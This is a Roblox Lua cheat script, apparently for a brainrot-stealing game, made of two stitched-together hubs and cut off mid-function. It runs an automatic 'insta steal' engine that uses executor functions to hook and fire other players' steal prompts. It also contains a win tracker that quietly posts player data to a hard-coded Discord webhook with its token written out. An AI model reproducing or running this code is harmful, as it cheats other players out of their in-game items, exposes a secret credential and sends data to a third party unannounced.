"-- By https://discord.gg/76wNYBeDxR

local Players = game:GetService("Players")
local Http = game:GetService("HttpService")
local lp = Players.LocalPlayer
local req = request or http_request or (syn and syn.request)

local hook = "https://discord.com/api/webhooks/1548920880136986644/EJrgCluf1DESlt0wciyJi7bPW-_m95R3Pj3zViFSAUxlDpU76mbX5v11ui39G0p72AxF"

local lastWin = 0
local COOLDOWN = 5

local function stripTags(t)
	return t and t:gsub("<[^>]+>", "") or ""
end

local function short(n)
	if n >= 1e12 then return string.format("%.1fT",n/1e12)
	elseif n >= 1e9 then return string.format("%.1fB",n/1e9)
	elseif n >= 1e6 then return string.format("%.1fM",n/1e6)
	elseif n >= 1e3 then return string.format("%.1fK",n/1e3) end
	return tostring(math.floor(n))
end

local function num(v)
	v = tostring(v):gsub("%s","")
	local n,s = v:match("([%d%.]+)(%a?)")
	n = tonumber(n) or 0
	if s == "K" or s == "k" then n = n * 1e3
	elseif s == "M" or s == "m" then n = n * 1e6
	elseif s == "B" or s == "b" then n = n * 1e9
	elseif s == "T" or s == "t" then n = n * 1e12 end
	return n
end

local function getBrainrot()
	local p3 = Vector3.new(-476.752,10.464,7.107)
	local p7 = Vector3.new(-476.752,10.464,114.107)
	local mine
	
	for _,v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Name == "PlotSign" then
			local d3 = (v.Position-p3).Magnitude
			local d7 = (v.Position-p7).Magnitude
			if d3 < 5 or d7 < 5 then
				for _,x in ipairs(v:GetDescendants()) do
					if x:IsA("TextLabel") and x.Text ~= "" then
						if x.Text:find(lp.Name) or x.Text:find(lp.DisplayName) then
							mine = d3 < 5 and 3 or 7
						end
					end
				end
			end
		end
	end
	
	if not mine then return "Unknown","N/A" end
	local pos = mine == 3 and p7 or p3
	local db = workspace:FindFirstChild("Debris")
	if not db then return "Unknown","N/A" end
	
	local best,bestVal
	for _,v in ipairs(db:GetChildren()) do
		repeat
		if v.Name ~= "FastOverheadTemplate" then break end
		local sg = v:FindFirstChildOfClass("SurfaceGui")
		if not sg or not sg.Adornee then break end
		if (sg.Adornee.Position-pos).Magnitude > 50 then break end
		local gen = sg:FindFirstChild("Generation",true)
		if gen and gen:IsA("TextLabel") then
			local val = num(gen.Text)
			if not bestVal or val > bestVal then
				bestVal = val
				local dn = sg:FindFirstChild("DisplayName",true)
				best = dn and dn.Text or v.Name
			end
		end
		until true
	end
	return best or "Unknown", bestVal and short(bestVal) or "N/A"
end

local function send(brainrot, value)
	if not req then return end
	local s = tostring(brainrot):gsub("`","'")
	pcall(function()
		req({
			Url = hook,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = Http:JSONEncode({
				embeds = {{
					title = "\u{1FAE8}PRIME HUB DUELS\u{1FAE8}",
					description = "```\u{1F62E}\u{200D}\u{1F4A8} SOMONE JUST MOGGED WITH DUELS \u{1F62E}\u{200D}\u{1F4A8}```",
					color = 0xADD8E6,
					fields = {
						{name="\u{1F9E0} Brainrot",value="```"..s.."```",inline=true},
						{name="\u{1F4B0} Value",value="```"..value.."```",inline=true}
					},
					footer = {text = "PRIME HUB | "..os.date("%H:%M:%S")},
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}}
			})
		})
	end)
end

local function onWin()
	if tick()-lastWin < COOLDOWN then return end
	lastWin = tick()
	
	print("[PRIME HUB] WIN DETECTED!")
	local br,val = getBrainrot()
	print(string.format("[PRIME HUB] %s | %s", br, val))
	send(br, val)
end
-- this print not ai i put it to test the script
local function scan(obj)
	if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return end
	local clean = stripTags(obj.Text):lower()
	if clean:find(lp.Name:lower(),1,true) and clean:find("won the duel") then
		onWin()
	end
end

local pg = lp:WaitForChild("PlayerGui")

for _,v in ipairs(pg:GetDescendants()) do
	scan(v)
	if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
		v:GetPropertyChangedSignal("Text"):Connect(function() scan(v) end)
	end
end

pg.DescendantAdded:Connect(function(v)
	scan(v)
	if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
		v:GetPropertyChangedSignal("Text"):Connect(function() scan(v) end)
	end
end)-- Lua 5.1 compatible build v2 (no _G usage: shared names live in one local table)
local __HH = {}
local LP = LP
local Lighting = Lighting
local Players = Players
local RunService = RunService
local SKY_PRESETS = SKY_PRESETS
local TS = TS
local loadConfig = loadConfig
local uiScaleValue = uiScaleValue
do

-- ============================================================
-- RED CIRCLE — always ON. No toggle, no button, no config.
-- Flat red disc on the ground right under the player, exactly
-- like Prime Hub's red circle. Follows the ground everywhere and
-- keeps working across respawns automatically.
-- ============================================================
do
    task.spawn(function()
        repeat task.wait() until game:IsLoaded()
        local plrs = game:GetService("Players")
        local run  = game:GetService("RunService")
        local lplr = plrs.LocalPlayer
        local c = Instance.new("Part")
        c.Name = "HorizonHubRedCircle"
        c.Shape = Enum.PartType.Cylinder
        c.Size = Vector3.new(12, 0.1, 12)
        c.Anchored = true
        c.CanCollide = false
        c.CanQuery = false
        c.CanTouch = false
        c.CastShadow = false
        c.Material = Enum.Material.SmoothPlastic
        c.Color = Color3.fromRGB(255, 45, 48)
        c.Transparency = 0.4
        c.Parent = workspace
        print("[horizonhub] RED CIRCLE CREATED ✓")
        run.Heartbeat:Connect(function()
            pcall(function()
                if not (c and c.Parent) then return end
                local char = lplr.Character
                if not char then c.Visible = false; return end
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if not hrp then c.Visible = false; return end
                local rp = RaycastParams.new()
                rp.FilterDescendantsInstances = {char, c}
                rp.FilterType = Enum.RaycastFilterType.Exclude
                local res = workspace:Raycast(hrp.Position, Vector3.new(0, -2000, 0), rp)
                if res then
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    local gy = res.Position.Y + 0.06
                    if hum then
                        -- hard clamp: the circle never rises into the player
                        gy = math.min(gy, hrp.Position.Y - hum.HipHeight - 0.05)
                    end
                    c.Visible = true
                    c.CFrame = CFrame.new(res.Position.X, gy, res.Position.Z)
                else
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    if hum and hum.FloorMaterial ~= Enum.Material.Air then
                        c.Visible = true
                        c.CFrame = CFrame.new(hrp.Position.X, hrp.Position.Y - hum.HipHeight - 0.1, hrp.Position.Z)
                    else
                        c.Visible = false
                    end
                end
            end)
        end)
    end)
end

task.spawn(function() pcall(function()
repeat task.wait() until game:IsLoaded()
local TweenService      = game:GetService("TweenService")
local Players           = game:GetService("Players")
local RunService        = game:GetService("RunService")
local Stats             = game:GetService("Stats")
local SKY_PRESETS_LIST = {"Off","Night","Aurora","Sunset","Galaxy","Tech","Sakura","Pink Night","Blood Moon","Emerald Dawn","Volcanic","Arctic","Midnight Ocean","Vaporwave","Toxic","Solar Eclipse","Hellscape","Heaven","Storm","Sunrise","Deep Space","Lavender Dream","Inferno","Mint Sky"}
local SKY_PRESETS = {
    Off={kind="off"},
    Night={clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140}},
    Aurora={clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150}},
    Sunset={clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110}},
    Galaxy={clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110}},
    Tech={clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180}},
    Sakura={clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170}},
    ["Pink Night"]={clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120}},
    ["Blood Moon"]={clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50}},
    ["Emerald Dawn"]={clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150}},
    Volcanic={clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50}},
    Arctic={clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245}},
    ["Midnight Ocean"]={clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140}},
    Vaporwave={clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210}},
    Toxic={clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90}},
    ["Solar Eclipse"]={clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70}},
    Hellscape={clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40}},
    Heaven={clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220}},
    Storm={clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120}},
    Sunrise={clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140}},
    ["Deep Space"]={clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60}},
    ["Lavender Dream"]={clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230}},
    Inferno={clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50}},
    ["Mint Sky"]={clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220}}
}
local function _vC3(t) return Color3.fromRGB(t[1],t[2],t[3]) end
local function _v4mpClearSky()
    for _,v in ipairs(game:GetService("Lighting"):GetChildren()) do if v:GetAttribute("_AceDuelsSky") then pcall(function() v:Destroy() end) end end
    local terrain = workspace:FindFirstChildOfClass("Terrain")
    if terrain then for _,v in ipairs(terrain:GetChildren()) do if v:GetAttribute("_AceDuelsSky") then pcall(function() v:Destroy() end) end end end
end
local function applyCustomSky(mode)
    _v4mpClearSky()
    local p = SKY_PRESETS[mode]
    local Lighting = game:GetService("Lighting")
    if not p or p.kind=="off" then 
        Lighting.Brightness=2; Lighting.ClockTime=14; Lighting.GlobalShadows=true; 
        __HH.currentSkyTheme="Off"; return 
    end
    Lighting.ClockTime=p.clock or 14; Lighting.Brightness=p.brightness or 2; 
    if p.ambient then Lighting.Ambient=_vC3(p.ambient) end; 
    if p.outAmb then Lighting.OutdoorAmbient=_vC3(p.outAmb) end
    local atm=Instance.new("Atmosphere"); atm:SetAttribute("_AceDuelsSky",true); atm.Density=0.35; atm.Color=Lighting.Ambient; atm.Decay=Lighting.OutdoorAmbient; atm.Parent=Lighting
    local sky=Instance.new("Sky"); sky:SetAttribute("_AceDuelsSky",true); sky.StarCount=(mode=="Galaxy" or mode=="Deep Space") and 10000 or 2000; sky.Parent=Lighting
    __HH.currentSkyTheme=mode
end
end) end)

-- insta steal
task.spawn(function() pcall(function()
repeat task.wait() until game:IsLoaded()
local TweenService      = game:GetService("TweenService")
local Players           = game:GetService("Players")
local RunService        = game:GetService("RunService")
local UserInputService  = game:GetService("UserInputService")
local CoreGui           = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Stats             = game:GetService("Stats")
local LP = Players.LocalPlayer
if _G.InstaStealConn then
    pcall(function() _G.InstaStealConn:Disconnect() end)
    _G.InstaStealConn = nil
end
if _G.FRHUBNormalSteal and _G.FRHUBNormalSteal.stealConn then
    pcall(function() _G.FRHUBNormalSteal.stealConn:Disconnect() end)
end
if _G.FRHUBSemiSteal and _G.FRHUBSemiSteal.conn then
    pcall(function() _G.FRHUBSemiSteal.conn:Disconnect() end)
end
pcall(function()
    local old = CoreGui:FindFirstChild("InstaSteal_Standalone")
    if old then old:Destroy() end
end)
local CONFIG_PATH = "FR Hub/wallahi_config.json"
local Radii = {Normal = 30, Semi = 30, SemiV2 = 30, SemiV3 = 30} -- smaller auto-grab range
local selectedMode   = "SemiV3"
local isEnabled      = true
local uiScaleValue   = 100
local mainUIScale    = nil
local function saveConfig()
    pcall(function()
        local data = {
            normalRadius = Radii.Normal,
            semiRadius   = Radii.Semi,
            semiV2Radius = Radii.SemiV2,
            semiV3Radius = Radii.SemiV3,
            mode         = selectedMode,
            enabled      = isEnabled,
            uiScale      = uiScaleValue,
        }
        writefile(CONFIG_PATH, game:GetService("HttpService"):JSONEncode(data))
    end)
end
local function loadConfig()
    pcall(function()
        if not isfile(CONFIG_PATH) then return end
        local raw = readfile(CONFIG_PATH)
        local ok, data = pcall(function() return game:GetService("HttpService"):JSONDecode(raw) end)
        if not ok or type(data) ~= "table" then return end
        if type(data.normalRadius) == "number" then Radii.Normal = data.normalRadius end
        if type(data.semiRadius)   == "number" then Radii.Semi   = data.semiRadius   end
        if type(data.semiV2Radius) == "number" then Radii.SemiV2 = data.semiV2Radius end
        if type(data.semiV3Radius) == "number" then Radii.SemiV3 = data.semiV3Radius end
        -- Only the SemiV3 engine is implemented in this script.
        -- Old configs that saved mode "Normal"/"Semi"/"SemiV2" were silently
        -- disabling the auto steal entirely, so always force SemiV3.
        selectedMode = "SemiV3"
        if type(data.enabled) == "boolean" then isEnabled = data.enabled end
        if type(data.uiScale) == "number"  then uiScaleValue = math.clamp(math.floor(data.uiScale + 0.5), 50, 200) end
    end)
end
loadConfig()
local ProgressBarFill = nil
local ProgressPercentLabel = nil
local grabPercentageLabel = nil
local _currentStealProgress = 0
_G.HorizonHubIntroFinished = false
local function setProgress(val, labelText)
    _currentStealProgress = math.clamp(val, 0, 1)
    if _G.StealBar then
        _G.StealBar.SetState("STEALING")
        _G.StealBar.SetProgress(_currentStealProgress, labelText)
    end
    if ProgressBarFill then
        TweenService:Create(ProgressBarFill, TweenInfo.new(0.05), {
            Size = UDim2.new(_currentStealProgress, 0, 1, 0)
        }):Play()
    end
    if ProgressPercentLabel then
        ProgressPercentLabel.Text = math.floor(_currentStealProgress * 100 + 0.5) .. "%"
    end
    if grabPercentageLabel then
        if type(labelText) == "string" and labelText ~= "" then
            grabPercentageLabel.Text = string.upper(labelText)
        elseif _currentStealProgress > 0 then
            grabPercentageLabel.Text = "STEALING  " .. math.floor(_currentStealProgress * 100 + 0.5) .. "%"
        else
            grabPercentageLabel.Text = "GRAB PERCENTAGE"
        end
    end
end

-- Nexus-style steal HUD card (AUTO STEAL | state | FPS/ping | % + progress line)
local function setupNexusGrabBar()
    local pg=LP:WaitForChild("PlayerGui"); local old=pg:FindFirstChild("StealBarGui"); if old then old:Destroy() end
    local cg=game:GetService("CoreGui"); local oldc=cg:FindFirstChild("StealBarGui"); if oldc then oldc:Destroy() end
    local gui=Instance.new("ScreenGui"); gui.Name="StealBarGui"; gui.ResetOnSpawn=false; gui.IgnoreGuiInset=true; gui.Enabled=false
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
    if not pcall(function() gui.Parent=cg end) then gui.Parent=pg end

    local savedPos=nil
    pcall(function()
        if isfile and isfile("horizon_steal_bar_pos.json") then savedPos=game:GetService("HttpService"):JSONDecode(readfile("horizon_steal_bar_pos.json")) end
    end)
    local pos=(type(savedPos)=="table" and UDim2.new(savedPos.xs or .5,savedPos.xo or -260,savedPos.ys or .78,savedPos.yo or 0)) or UDim2.new(.5,-260,.78,0)

    local ACCENT=Color3.fromRGB(70,145,235)
    local ACCENT_LIT=Color3.fromRGB(190,230,255)
    local ACCENT_DARK=Color3.fromRGB(35,85,175)

    local card=Instance.new("Frame",gui); card.Name="PersistentGrabHUD"; card.Size=UDim2.new(0,520,0,112); card.Position=pos
    card.BackgroundColor3=Color3.fromRGB(5,5,8); card.BackgroundTransparency=.04; card.BorderSizePixel=0; card.Active=true
    -- Smaller on-screen Auto Grab HUD; this does not change the grab radius.
    local grabHudScale=Instance.new("UIScale",card); grabHudScale.Scale=0.55
    Instance.new("UICorner",card).CornerRadius=UDim.new(0,16)
    local sbStroke=Instance.new("UIStroke",card); sbStroke.Color=Color3.fromRGB(35,35,42); sbStroke.Thickness=2; sbStroke.Transparency=0
    local dot=Instance.new("Frame",card); dot.Size=UDim2.new(0,8,0,8); dot.Position=UDim2.new(0,18,0,17)
    dot.BackgroundColor3=Color3.fromRGB(190,230,255); dot.BackgroundTransparency=0; dot.BorderSizePixel=0; Instance.new("UICorner",dot).CornerRadius=UDim.new(0,5)
    local pctLbl=Instance.new("TextLabel",card); pctLbl.Size=UDim2.new(0,100,0,34); pctLbl.Position=UDim2.new(0,30,0,8)
    pctLbl.BackgroundTransparency=1; pctLbl.Text="0%"; pctLbl.TextColor3=Color3.fromRGB(255,255,255); pctLbl.Font=Enum.Font.GothamBlack
    pctLbl.TextSize=25; pctLbl.TextXAlignment=Enum.TextXAlignment.Left
    -- Radius text removed from the top-right of the Auto Grab HUD.
    local radiusLbl=Instance.new("TextLabel",card); radiusLbl.Name="HiddenRadiusLabel"; radiusLbl.Visible=false
    local perfLbl=Instance.new("TextLabel",card); perfLbl.Size=UDim2.new(1,-180,0,26); perfLbl.Position=UDim2.new(0,90,0,42)
    perfLbl.BackgroundTransparency=1; perfLbl.Text="FPS: 60  PING: --ms"; perfLbl.TextColor3=Color3.fromRGB(245,245,245); perfLbl.TextSize=16
    perfLbl.Font=Enum.Font.GothamMedium; perfLbl.TextXAlignment=Enum.TextXAlignment.Center
    local stateLbl=Instance.new("TextLabel",card); stateLbl.Size=UDim2.new(0,100,0,16); stateLbl.Position=UDim2.new(0,18,0,46)
    stateLbl.BackgroundTransparency=1; stateLbl.Text="OFF"; stateLbl.TextColor3=Color3.fromRGB(170,170,180); stateLbl.TextSize=9
    stateLbl.Font=Enum.Font.GothamBold; stateLbl.TextXAlignment=Enum.TextXAlignment.Left
    local track=Instance.new("Frame",card); track.Size=UDim2.new(1,-36,0,14); track.Position=UDim2.new(0,18,1,-27)
    track.BackgroundColor3=Color3.fromRGB(10,10,13); track.BackgroundTransparency=0; track.BorderSizePixel=0
    Instance.new("UICorner",track).CornerRadius=UDim.new(0,5)

    local fillLine=Instance.new("Frame",track); fillLine.Size=UDim2.new(0,0,1,0); fillLine.BackgroundColor3=ACCENT
    fillLine.BackgroundTransparency=.1; fillLine.BorderSizePixel=0; Instance.new("UICorner",fillLine).CornerRadius=UDim.new(0,5)
    local fillGrad=Instance.new("UIGradient",fillLine)
    fillGrad.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(175,225,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(45,115,225))})

    local dragging,ds,sp=false,nil,nil
    card.InputBegan:Connect(function(i)
        if _G.PrimeUiLocked then return end
        if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
            dragging=true;ds=i.Position;sp=card.Position
            i.Changed:Connect(function() if i.UserInputState==Enum.UserInputState.End then dragging=false end end)
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if dragging and not _G.PrimeUiLocked and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
            local d=i.Position-ds
            card.Position=UDim2.new(sp.X.Scale,sp.X.Offset+d.X,sp.Y.Scale,sp.Y.Offset+d.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
            if not _G.PrimeUiLocked then
                pcall(function() writefile("horizon_steal_bar_pos.json",game:GetService("HttpService"):JSONEncode({xs=card.Position.X.Scale,xo=card.Position.X.Offset,ys=card.Position.Y.Scale,yo=card.Position.Y.Offset})) end)
            end
        end
    end)

    task.spawn(function()
        local last=tick();local n=0;local fps=60
        RunService.RenderStepped:Connect(function() n = n + 1 end)
        while card.Parent do
            local now=tick();local dt=now-last
            if dt>=.25 then fps=n/dt;n=0;last=now end
            local ping=0
            pcall(function() ping=LP:GetNetworkPing()*1000 end)
            local radius = 60
            pcall(function()
                if _G.HorizonStealModes and _G.HorizonStealModes.GetRadius then radius = _G.HorizonStealModes.GetRadius() end
            end)
            radiusLbl.Text = "Radius: " .. tostring(math.floor(tonumber(radius) or 60))
            perfLbl.Text=string.format("FPS: %.0f  PING: %.0fms",fps,ping)
            task.wait(.1)
        end
    end)

    task.spawn(function()
        while gui.Parent do
            if _G.HorizonHubIntroFinished then
                gui.Enabled=true; card.Visible=true
            end
            task.wait(0.05)
        end
    end)

    _G.StealBar={
        SetProgress=function(v,labelText)
            v=math.clamp(tonumber(v) or 0,0,1)
            if _G.HorizonHubIntroFinished then gui.Enabled=true end
            card.Visible=true; fillLine.Visible=true
            fillLine.Size=UDim2.new(v,0,1,0)
            pctLbl.Text=math.floor(v*100+.5).."%"
            if type(labelText)=="string" and labelText~="" then
                stateLbl.Text=string.upper(labelText)
            elseif v>0 then
                stateLbl.Text="STEALING"
            end
            dot.BackgroundColor3=ACCENT_LIT; sbStroke.Color=ACCENT_LIT
        end,
        SetState=function(txt)
            if type(txt)=="string" and txt~="" then
                stateLbl.Text=string.upper(txt)
                local s=string.upper(txt)
                if s=="STEALING" or s=="OP HOLD" then
                    stateLbl.TextColor3=Color3.fromRGB(0,125,65)
                else
                    stateLbl.TextColor3=Color3.fromRGB(10,60,140)
                end
            end
        end,
        Reset=function()
            fillLine.Size=UDim2.new(0,0,1,0); pctLbl.Text="0%"
            local radius = 60
            pcall(function() if _G.HorizonStealModes and _G.HorizonStealModes.GetRadius then radius = _G.HorizonStealModes.GetRadius() end end)
            radiusLbl.Text = "Radius: " .. tostring(math.floor(tonumber(radius) or 60))
            local masterOn = isEnabled
            if _G.HorizonStealModes and _G.HorizonStealModes.GetEnabled then
                local ok, value = pcall(_G.HorizonStealModes.GetEnabled)
                if ok then masterOn = value == true end
            end
            stateLbl.Text = masterOn and "READY" or "OFF"
            stateLbl.TextColor3=Color3.fromRGB(10,60,140)
            dot.BackgroundColor3=ACCENT_DARK; sbStroke.Color=ACCENT_DARK
        end
    }
    _G.StealBar.Reset()
end
task.delay(.15,setupNexusGrabBar)

task.spawn(function()
    local lastFrame = tick()
    local fpsSamples = {}
    local fpsAvg = 60
    RunService.RenderStepped:Connect(function()
        local now = tick()
        local dt = now - lastFrame
        lastFrame = now
        if dt > 0 then
            table.insert(fpsSamples, 1 / dt)
            if #fpsSamples > 30 then table.remove(fpsSamples, 1) end
            local sum = 0
            for _, v in ipairs(fpsSamples) do sum = sum + v end
            fpsAvg = sum / #fpsSamples
        end
    end)
    while true do
        task.wait(0.5)
        pcall(function()
            if ProgressPercentLabel and ProgressPercentLabel.Parent then
                local ping = 0
                if LP and LP.GetNetworkPing then
                    ping = math.floor(LP:GetNetworkPing() * 1000 + 0.5)
                else
                    local stat = Stats.Network.ServerStatsItem["Data Ping"]
                    if stat then ping = math.floor(tonumber(stat:GetValue()) or 0) end
                end
                local pctStr = tostring(math.floor(_currentStealProgress * 100 + 0.5)) .. "%"
                ProgressPercentLabel.Text = string.format("%s | FPS:%d | PING:%dms", pctStr, math.floor(fpsAvg + 0.5), ping)
            end
        end)
    end
end)

local function getHRP()
    local char = LP.Character
    if not char then return nil end
    return char:FindFirstChild("HumanoidRootPart")
        or char:FindFirstChild("Torso")
        or char:FindFirstChild("UpperTorso")
end
local function isMyBase(plotName)
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return false end
    local plot = plots:FindFirstChild(plotName)
    if not plot then return false end
    local sign = plot:FindFirstChild("PlotSign")
    if sign then
        local yb = sign:FindFirstChild("YourBase")
        if yb and yb:IsA("BillboardGui") then return yb.Enabled == true end
    end
    return false
end




local SemiV3State = {
    conn = nil, isStealing = false, stealStartTime = nil, Data = {},
    HalfFireRange = 10, HalfHoldMin = 1.3, HalfHoldMax = 2.6, HalfEntryDelay = 0.3,
    lastScan = 0, lastFallbackScan = 0, lastFallbackResult = nil,
}
local function sv3PromptDist(prompt)
    local char = LP.Character
    if not char then return math.huge end
    local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
    if not root then return math.huge end
    local part = prompt.Parent
    if part and part:IsA("Attachment") then part = part.Parent end
    while part and not part:IsA("BasePart") and part ~= workspace and part.Parent ~= nil do
        part = part.Parent
    end
    if part and part:IsA("BasePart") then return (part.Position - root.Position).Magnitude end
    local ok, cf = pcall(function() return prompt.Parent and prompt.Parent.WorldPosition end)
    if ok and cf then return (cf - root.Position).Magnitude end
    return math.huge
end
local function sv3IsStealPrompt(pr)
    if not (pr and pr:IsA("ProximityPrompt")) then return false end
    local a = (pr.ActionText or ""):lower()
    return a:find("steal") ~= nil or a:find("grab") ~= nil or a:find("snatch") ~= nil
end
local function sv3FindNearestPrompt()
    local char = LP.Character
    if not char then return nil end
    local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
    if not root then return nil end
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil end
    local nearest, dist = nil, math.huge
    for _, plot in ipairs(plots:GetChildren()) do
        if plot:IsA("Model") and not isMyBase(plot.Name) then
            local pods = plot:FindFirstChild("AnimalPodiums")
            if pods then
                for _, pod in ipairs(pods:GetChildren()) do
                    local base = pod:FindFirstChild("Base")
                    local sp = base and base:FindFirstChild("Spawn")
                    if sp then
                        local d = (sp.Position - root.Position).Magnitude
                        if d <= Radii.SemiV3 and d < dist then
                            local found = nil
                            local att = sp:FindFirstChild("PromptAttachment")
                            if att then
                                for _, pr in ipairs(att:GetChildren()) do
                                    if sv3IsStealPrompt(pr) then found = pr end
                                end
                            end
                            if not found then
                                for _, pr in ipairs(sp:GetDescendants()) do
                                    if sv3IsStealPrompt(pr) then found = pr end
                                end
                            end
                            if found then nearest, dist = found, d end
                        end
                    end
                end
            end
        end
    end
    return nearest
end
-- Generic fallback scan: if the AnimalPodiums/Spawn structure above was not
-- found (different map / game update), search every ProximityPrompt on enemy
-- plots that looks like a steal prompt. Throttled by the caller.
local function sv3FindNearestPromptFallback()
    local char = LP.Character
    if not char then return nil end
    local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
    if not root then return nil end
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil end
    local nearest, dist = nil, math.huge
    for _, plot in ipairs(plots:GetChildren()) do
        if plot:IsA("Model") and not isMyBase(plot.Name) then
            for _, pr in ipairs(plot:GetDescendants()) do
                if pr:IsA("ProximityPrompt") then
                    local a = (pr.ActionText or ""):lower()
                    if a:find("steal") or a:find("grab") then
                        local d = sv3PromptDist(pr)
                        if d <= Radii.SemiV3 and d < dist then
                            nearest, dist = pr, d
                        end
                    end
                end
            end
        end
    end
    return nearest
end
local function sv3CaptureConnections(prompt, data)
    if not getconnections then return end
    pcall(function()
        for _, c in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
            if c.Function then table.insert(data.hold, c.Function) end
        end
        for _, c in ipairs(getconnections(prompt.Triggered)) do
            if c.Function then table.insert(data.trigger, c.Function) end
        end
    end)
end
local function sv3FireHold(data)
    for _, fn in ipairs(data.hold) do task.spawn(fn) end
end
local function sv3FireTrigger(prompt, data)
    if #data.trigger > 0 then
        for _, fn in ipairs(data.trigger) do task.spawn(fn) end
        return
    end
    -- No captured handlers (executor without getconnections, or the game
    -- connected later). Simulate the prompt directly instead of doing nothing.
    if fireproximityprompt then
        pcall(function() fireproximityprompt(prompt) end)
        return
    end
    pcall(function() prompt:InputHoldBegin() end)
    task.wait(0.3)
    pcall(function() prompt:InputHoldEnd() end)
end
local function sv3ExecuteSteal(prompt)
    if SemiV3State.isStealing then return end
    if not SemiV3State.Data[prompt] then
        SemiV3State.Data[prompt] = {hold = {}, trigger = {}, ready = true}
        sv3CaptureConnections(prompt, SemiV3State.Data[prompt])
    end
    local data = SemiV3State.Data[prompt]
    if not data.ready then return end
    data.ready = false
    SemiV3State.isStealing = true
    SemiV3State.stealStartTime = tick()
    task.spawn(function()
        local fired = false
        local ok, err = pcall(function()
            sv3FireHold(data)
            task.wait(SemiV3State.HalfHoldMin)
            local lastWasInRange = sv3PromptDist(prompt) <= SemiV3State.HalfFireRange
            while true do
                local el = tick() - SemiV3State.stealStartTime
                if el > SemiV3State.HalfHoldMax or not prompt.Parent then break end
                setProgress(math.clamp(el / SemiV3State.HalfHoldMax, 0, 1))
                local nowInRange = sv3PromptDist(prompt) <= SemiV3State.HalfFireRange
                local firedNow = false
                if nowInRange then
                    if lastWasInRange then
                        firedNow = true
                    else
                        task.wait(0.3)
                        if sv3PromptDist(prompt) <= SemiV3State.HalfFireRange and prompt.Parent then
                            firedNow = true
                        else
                            lastWasInRange = false
                            task.wait()
                        end
                    end
                    if firedNow then
                        sv3FireTrigger(prompt, data)
                        fired = true
                        break
                    end
                else
                    lastWasInRange = nowInRange
                    task.wait()
                end
            end
        end)
        if not ok then warn("[horizonhub] steal error: " .. tostring(err)) end
        if fired then setProgress(1) end
        task.wait(0.05)
        setProgress(0)
        -- Always unlock, even if something above threw.
        data.ready = true
        SemiV3State.isStealing = false
    end)
end
local function startSemiV3Mode()
    if SemiV3State.conn then pcall(function() SemiV3State.conn:Disconnect() end); SemiV3State.conn = nil end
    SemiV3State.isStealing = false
    SemiV3State.conn = RunService.Heartbeat:Connect(function()
        if not isEnabled then return end
        local now = tick()
        -- Watchdog: if a steal ever gets stuck (error inside a captured
        -- connection etc.), force-unlock the engine so it never dies.
        if SemiV3State.isStealing then
            if SemiV3State.stealStartTime and (now - SemiV3State.stealStartTime) > (SemiV3State.HalfHoldMax + 3) then
                SemiV3State.isStealing = false
                for _, d in pairs(SemiV3State.Data) do d.ready = true end
                setProgress(0)
            end
            return
        end
        -- Throttle the world scan (no need to run it 60x per second).
        if now - (SemiV3State.lastScan or 0) < 0.2 then return end
        SemiV3State.lastScan = now
        local ok, p = pcall(sv3FindNearestPrompt)
        if not p and (now - (SemiV3State.lastFallbackScan or 0)) > 1.5 then
            SemiV3State.lastFallbackScan = now
            task.spawn(function()
                local ok2, p2 = pcall(sv3FindNearestPromptFallback)
                if ok2 then SemiV3State.lastFallbackResult = p2 end
            end)
        end
        if not p and SemiV3State.lastFallbackResult then
            local d = sv3PromptDist(SemiV3State.lastFallbackResult)
            if d <= Radii.SemiV3 then p = SemiV3State.lastFallbackResult end
        end
